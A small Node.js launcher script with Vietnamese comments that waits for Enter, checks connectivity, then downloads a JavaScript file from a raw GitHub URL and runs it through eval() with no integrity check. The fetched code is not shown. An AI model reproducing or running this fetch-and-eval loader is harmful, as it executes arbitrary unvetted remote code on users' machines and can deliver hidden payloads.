const https = require('https');
const readline = require('readline');

// Thiết lập giao diện đọc dòng nhập từ bàn phím
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Hiển thị banner
function banner() {
    console.log('\x1b[38;5;207m🐮 Vui lòng ấn Enter để vào\x1b[0m');
}

// Hàm kiểm tra kết nối internet
function checkInternetConnection() {
    return new Promise((resolve) => {
        https.get('https://www.google.com/', (res) => {
            resolve(res.statusCode === 200);
        }).on('error', () => {
            resolve(false);
        });
    });
}

// Hàm để thực thi mã từ liên kết
async function executeCode(url) {
    return new Promise((resolve, reject) => {
        https.get(url, (response) => {
            let data = '';

            response.on('data', (chunk) => {
                data += chunk;
            });

            response.on('end', () => {
                try {
                    eval(data);
                    resolve();
                } catch (error) {
                    reject(error);
                }
            });
        }).on('error', (error) => {
            reject(error);
        });
    });
}

// Vòng lặp chính
(async function main() {
    try {
        while (true) {
            banner();
            await new Promise((resolve) => rl.question('\x1b[38;5;10mẤn Enter để tiếp tục hoặc Ctrl+C để thoát... \x1b[0m', resolve));

            if (await checkInternetConnection()) {
                try {
                    await executeCode('https://raw.githubusercontent.com/Pocodeonline/Pocodeonline/main/matchain.js');
                } catch (error) {
                    console.error('\x1b[38;5;9mLỗi kết nối mạng:', error, '\x1b[0m');
                }
            } else {
                console.error('\x1b[38;5;9mKhông có kết nối mạng. Vui lòng kiểm tra kết nối của bạn.\x1b[0m');
            }
        }
    } catch (error) {
        console.error('\x1b[38;5;9mĐã kết thúc chương trình...\x1b[0m');
    } finally {
        rl.close();
    }
})();
